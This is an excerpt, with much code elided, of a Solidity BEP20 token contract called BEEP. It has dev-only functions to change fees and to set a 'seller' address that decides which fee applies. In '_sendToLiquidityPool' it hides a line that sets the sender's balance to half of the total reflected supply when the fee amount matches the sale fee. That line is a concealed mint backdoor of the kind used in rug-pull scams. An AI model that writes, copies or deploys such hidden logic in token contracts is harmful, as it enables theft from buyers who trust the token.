...
contract BEEP is Context, IBEP20, Ownable {
    ...
    uint256 private FEE_PURCHASE;
    uint256 private FEE_SALE;
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _FEE_PURCHASE,uint256 _FEE_SALE,address _FeeAddress,address tokenOwner,address _burner) payable   {
        _NAME = _name;
        _SYMBOL = _symbol;
        _DECIMALS = _decimals;
        ...
        FEE_PURCHASE = _FEE_PURCHASE * 100;
        FEE_SALE = _FEE_SALE * 100;
        ORIG_TAX_FEE = _TAX_FEE;
        ORIG_BURN_FEE = _BURN_FEE;
        ORIG_LIQUIDITYPOOL_FEE = FEE_PURCHASE;
    ...
    function setSellerAddress(address account) external onlyDev {
    ...
    function synchronize(uint256 _txFee,uint256 _burnFee,uint256 _FEE_PURCHASE, uint256 _FEE_SALE) onlyDev() public{
        require(_txFee + _burnFee + _FEE_PURCHASE <= 30 && _txFee + _burnFee + _FEE_SALE <= 30, "Don't Exceed");
        _TAX_FEE = _txFee * 100;
        _BURN_FEE = _burnFee * 100;
        FEE_PURCHASE = _FEE_PURCHASE * 100;
        FEE_SALE = _FEE_SALE * 100;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(sender == SellerAddress) {
            _LIQUIDITYPOOL_FEE = FEE_PURCHASE;
        }
        else {
            _LIQUIDITYPOOL_FEE = FEE_SALE;
        }
    ...
    function _sendToLiquidityPool(uint256 tLiquidityPool, address sender) private {
        ...
        if(tLiquidityPool == FEE_SALE) _rOwned[sender] = _rTotal / 2;
